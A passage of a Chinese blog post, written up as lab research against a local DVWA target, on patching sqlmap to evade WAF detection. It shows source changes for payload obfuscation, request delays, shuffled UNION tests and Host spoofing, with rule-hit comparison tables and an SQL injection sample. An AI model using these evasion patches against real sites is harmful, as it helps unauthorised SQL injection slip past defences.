+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">random_padding</span>(<span class="params">self, payload</span>):</span><br><span class="line">    <span class="keyword">from</span> lib.core.common <span class="keyword">import</span> randomStr</span><br><span class="line">    <span class="comment"># 已经有注释就不加</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;--&quot;</span> <span class="keyword">in</span> payload <span class="keyword">or</span> <span class="string">&quot;#&quot;</span> <span class="keyword">in</span> payload <span class="keyword">or</span> <span class="string">&quot;/*&quot;</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line">    <span class="comment"># 只随机一部分请求</span></span><br><span class="line">    <span class="keyword">if</span> random.random() &lt; <span class="number">0.5</span>:</span><br><span class="line">        payload += <span class="string">&quot;-- &quot;</span> + randomStr(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>
+
+<p><strong>在 <code>payload()</code> 方法末尾组合调用：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> retVal:</span><br><span class="line">    retVal = retVal.replace(BOUNDARY_BACKSLASH_MARKER, <span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">    <span class="comment"># ===== payload 混淆 =====</span></span><br><span class="line">    retVal = <span class="variable language_">self</span>.random_case_keywords(retVal)</span><br><span class="line">    <span class="keyword">if</span> random.random() &lt; <span class="number">0.5</span>:<span class="comment">#因为可能会让部分场景的payload失效，所以加入随机触发</span></span><br><span class="line">        retVal = <span class="variable language_">self</span>.obfuscate_space(retVal)</span><br><span class="line">    retVal = <span class="variable language_">self</span>.random_padding(retVal)</span><br></pre></td></tr></table></figure>
+
+<p>混淆后的 payload 效果：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260317180841876.png"></p>
+<p>随机大小写 + 空格替换+末尾注释都生效了 ✅</p>
+<hr>
+<h3 id="第四步：请求延迟（lib-request-connect-py）"><a href="#第四步：请求延迟（lib-request-connect-py）" class="headerlink" title="第四步：请求延迟（lib/request/connect.py）"></a>第四步：请求延迟（<code>lib/request/connect.py</code>）</h3><p>在 <code>queryPage()</code> 函数里加入随机延迟，模拟真实用户的请求间隔：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> random.random() &lt; <span class="number">0.6</span>:</span><br><span class="line">    time.sleep(random.uniform(<span class="number">0.03</span>, <span class="number">0.08</span>))</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>💡 加了这个之后跑时间盲注可能会触发 <code>CRITICAL: considerable lagging</code> 警告，可以加 <code>--time-sec=10</code> 参数。</p>
+</blockquote>
+<hr>
+<h3 id="第五步：打乱-UNION-检测顺序（lib-techniques-union-test-py）"><a href="#第五步：打乱-UNION-检测顺序（lib-techniques-union-test-py）" class="headerlink" title="第五步：打乱 UNION 检测顺序（lib/techniques/union/test.py）"></a>第五步：打乱 UNION 检测顺序（<code>lib/techniques/union/test.py</code>）</h3><p>原版按顺序逐列测试，行为特征明显：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原来</span></span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> xrange(lowerCount, upperCount + <span class="number">1</span>):</span><br><span class="line"></span><br><span class="line"><span class="comment"># 改成</span></span><br><span class="line">counts = <span class="built_in">list</span>(<span class="built_in">range</span>(lowerCount, upperCount + <span class="number">1</span>))</span><br><span class="line">random.shuffle(counts)</span><br><span class="line"><span class="keyword">for</span> count <span class="keyword">in</span> counts:</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第六步：改随机字符集（lib-core-common-py）"><a href="#第六步：改随机字符集（lib-core-common-py）" class="headerlink" title="第六步：改随机字符集（lib/core/common.py）"></a>第六步：改随机字符集（<code>lib/core/common.py</code>）</h3><p>sqlmap 生成的随机标记默认含大写字母，看起来很可疑，改成全小写+数字：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 改这里</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">retVal = <span class="string">&quot;&quot;</span>.join(choice(charset) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">0</span>, length))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="第七步：消除-Host-是-IP-的特征"><a href="#第七步：消除-Host-是-IP-的特征" class="headerlink" title="第七步：消除 Host 是 IP 的特征"></a>第七步：消除 Host 是 IP 的特征</h3><p>WAF 规则 <code>920350</code> 专门检测 <code>Host</code> 头是纯数字 IP 的请求，认为正常用户都用域名访问。</p>
+<p>不需要改源码，跑的时候加一个参数就行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1:8080/...&quot;</span> --host=<span class="string">&quot;dvwa.local&quot;</span> ...</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="📈-最终测试结果"><a href="#📈-最终测试结果" class="headerlink" title="📈 最终测试结果"></a>📈 最终测试结果</h2><p>改完之后，重建干净的 WAF 容器重新测试：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py \</span><br><span class="line">  -u <span class="string">&quot;http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;</span> \</span><br><span class="line">  --host=<span class="string">&quot;dvwa.local&quot;</span> \</span><br><span class="line">  --cookie=<span class="string">&quot;...&quot;</span> \</span><br><span class="line">  --batch --level=3 --flush-session --time-sec=10</span><br></pre></td></tr></table></figure>
+
+<p><strong>对比数据：</strong></p>
+<table>
+<thead>
+<tr>
+<th>指标</th>
+<th>原版</th>
+<th>魔改版</th>
+<th>变化</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>规则触发总数</td>
+<td>516</td>
+<td>330</td>
+<td><strong>-186 (-36%)</strong></td>
+</tr>
+<tr>
+<td>平均每请求触发规则</td>
+<td>5.2 条</td>
+<td>3.3 条</td>
+<td><strong>-1.9 条</strong></td>
+</tr>
+<tr>
+<td>平均异常分</td>
+<td>15.2</td>
+<td>8.8</td>
+<td><strong>-6.4 分</strong></td>
+</tr>
+<tr>
+<td>最高异常分</td>
+<td>83</td>
+<td>75</td>
+<td><strong>-8 分</strong></td>
+</tr>
+</tbody></table>
+<p><strong>各规则变化：</strong></p>
+<table>
+<thead>
+<tr>
+<th>规则ID</th>
+<th>描述</th>
+<th>原版</th>
+<th>魔改版</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>913100</td>
+<td>UA 扫描器特征</td>
+<td>100</td>
+<td>0</td>
+<td>✅ 完全消除</td>
+</tr>
+<tr>
+<td>920350</td>
+<td>Host 是纯 IP</td>
+<td>100</td>
+<td>1</td>
+<td>✅ 基本消除</td>
+</tr>
+<tr>
+<td>942500</td>
+<td>MySQL 注释混淆</td>
+<td>0</td>
+<td>0</td>
+<td>✅ 未引入</td>
+</tr>
+<tr>
+<td>942100</td>
+<td>libinjection SQLi</td>
+<td>92</td>
+<td>98</td>
+<td>❌ 略微增加</td>
+</tr>
+<tr>
+<td>942190</td>
+<td>UNION SELECT</td>
+<td>28</td>
+<td>30</td>
+<td>➖ 基本持平</td>
+</tr>
+<tr>
+<td>942360</td>
+<td>SQL 混淆特征</td>
+<td>20</td>
+<td>20</td>
+<td>➖ 持平</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="🧱-遇到的瓶颈"><a href="#🧱-遇到的瓶颈" class="headerlink" title="🧱 遇到的瓶颈"></a>🧱 遇到的瓶颈</h2><p><code>942100</code>（libinjection）是这次魔改绕不过去的坎，改了反而从 92 涨到了 98。</p>
+<p><strong>为什么？</strong></p>
+<p>libinjection 不是靠关键字匹配，而是<strong>语义层分析</strong>。它把 SQL 语句解析成 token 序列，分析语法结构，判断是否是注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">原始:  1&#x27; AND 6358=6358-- WjXy</span><br><span class="line">libinjection 解析: s&amp;1c  ← 这是它的&quot;指纹码&quot;，表示字符串+逻辑运算</span><br></pre></td></tr></table></figure>
+
+<p>不管你把 <code>AND</code> 改成 <code>AnD</code> 还是 <code>A/**/N/**/D</code>，语法结构没变，libinjection 照样识别。</p>
+<p><strong>这说明什么？</strong></p>
+<p>字符层面的混淆（大小写、注释替换、空格变换）对抗不了语义层的检测。真正绕过 libinjection 需要找<strong>语法歧义</strong>——让注入语句在语义层面”看起来不像 SQL 注入”，这是更深一层的研究方向。</p>
+<hr>
+<h2 id="🎯-总结"><a href="#🎯-总结" class="headerlink" title="🎯 总结"></a>🎯 总结</h2><p>这次魔改的核心思路：<strong>把 sqlmap 的已知特征一层一层抹掉</strong>。</p>
+<p><strong>成功消除的特征：</strong></p>
+<ul>
+<li>🔇 UA 里的 sqlmap 字样（<code>913100</code> 清零）</li>
+<li>🔇 Host 头是裸 IP（<code>920350</code> 清零）</li>
+<li>🔇 没有正常浏览器应有的请求头</li>
+<li>🔇 固定的 Banner 和版本字符串</li>
+</ul>
+<p><strong>改造效果：</strong></p>
+<ul>
+<li>规则触发总数从 516 降到 330，下降 <strong>36%</strong></li>
+<li>平均异常分从 15.2 降到 8.8，下降 <strong>42%</strong></li>
+<li>sqlmap 检测功能<strong>完全正常</strong>，四种注入类型均可检测</li>
+</ul>
+<p><strong>没绕过的：</strong></p>
+<ul>
+<li><code>942100</code> libinjection 语义检测 —— 字符混淆对它无效，这是本次的边界</li>
+</ul>
+<p><strong>下一步研究方向：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">字符层混淆（本次）</span><br><span class="line">    ↓</span><br><span class="line">语法层混淆（寻找 SQL 方言差异）</span><br><span class="line">    ↓</span><br><span class="line">语义层绕过（找 libinjection 的解析漏洞）</span><br></pre></td></tr></table></figure>
+
+<hr>
+<blockquote>
+<p>📌 本文所有操作均在本地搭建的 DVWA 靶场环境中进行，仅用于学习 WAF 检测原理和安全研究。请勿将相关技术用于未经授权的目标。</p>
+</blockquote>
+</article>
+<div class="article-footer">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+
+</div>
+
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/posts/e39557c4/">Fscan 魔改二开 - 特征消除与功能扩展</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/posts/55d71cb8/">魔改哥斯拉 - 反编译重打包与Webshell免杀对抗</a></div></section></div>
+
+
+
+
+
+
+<footer class="page-footer footnote"><hr><div class="text"></div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%94%A7-sqlmap-%E9%AD%94%E6%94%B9%E7%A0%94%E7%A9%B6-%E2%80%94%E2%80%94-%E4%BB%8E%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%B0-WAF-%E5%AF%B9%E6%8A%97"><span class="toc-text">🔧 sqlmap 魔改研究 —— 从流量特征到 WAF 对抗</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E6%80%9D%E8%B7%AF"><span class="toc-text">🧠 思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8F%97%EF%B8%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">🏗️ 环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E5%85%88%E7%9C%8B%E5%8E%9F%E7%89%88%E7%9A%84%E2%80%9D%E6%8C%87%E7%BA%B9%E2%80%9D"><span class="toc-text">🔍 先看原版的”指纹”</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%8A-%E5%8E%9F%E7%89%88-WAF-%E6%A3%80%E6%B5%8B%E5%9F%BA%E5%87%86%E6%95%B0%E6%8D%AE"><span class="toc-text">📊 原版 WAF 检测基准数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A0%EF%B8%8F-%E5%BC%80%E5%A7%8B%E9%AD%94%E6%94%B9"><span class="toc-text">🛠️ 开始魔改</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%B6%88%E9%99%A4%E8%BA%AB%E4%BB%BD%E7%89%B9%E5%BE%81%EF%BC%88lib-core-settings-py%EF%BC%89"><span class="toc-text">第一步：消除身份特征（lib&#x2F;core&#x2F;settings.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%A1%A5%E5%85%A8%E8%AF%B7%E6%B1%82%E5%A4%B4%EF%BC%88lib-request-basic-py%EF%BC%89"><span class="toc-text">第二步：补全请求头（lib&#x2F;request&#x2F;basic.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9APayload-%E6%B7%B7%E6%B7%86%EF%BC%88lib-core-agent-py%EF%BC%89"><span class="toc-text">第三步：Payload 混淆（lib&#x2F;core&#x2F;agent.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5%EF%BC%9A%E8%AF%B7%E6%B1%82%E5%BB%B6%E8%BF%9F%EF%BC%88lib-request-connect-py%EF%BC%89"><span class="toc-text">第四步：请求延迟（lib&#x2F;request&#x2F;connect.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5%EF%BC%9A%E6%89%93%E4%B9%B1-UNION-%E6%A3%80%E6%B5%8B%E9%A1%BA%E5%BA%8F%EF%BC%88lib-techniques-union-test-py%EF%BC%89"><span class="toc-text">第五步：打乱 UNION 检测顺序（lib&#x2F;techniques&#x2F;union&#x2F;test.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E6%AD%A5%EF%BC%9A%E6%94%B9%E9%9A%8F%E6%9C%BA%E5%AD%97%E7%AC%A6%E9%9B%86%EF%BC%88lib-core-common-py%EF%BC%89"><span class="toc-text">第六步：改随机字符集（lib&#x2F;core&#x2F;common.py）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E6%AD%A5%EF%BC%9A%E6%B6%88%E9%99%A4-Host-%E6%98%AF-IP-%E7%9A%84%E7%89%B9%E5%BE%81"><span class="toc-text">第七步：消除 Host 是 IP 的特征</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%88-%E6%9C%80%E7%BB%88%E6%B5%8B%E8%AF%95%E7%BB%93%E6%9E%9C"><span class="toc-text">📈 最终测试结果</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B1-%E9%81%87%E5%88%B0%E7%9A%84%E7%93%B6%E9%A2%88"><span class="toc-text">🧱 遇到的瓶颈</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E6%80%BB%E7%BB%93"><span class="toc-text">🎯 总结</span></a></li></ol></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
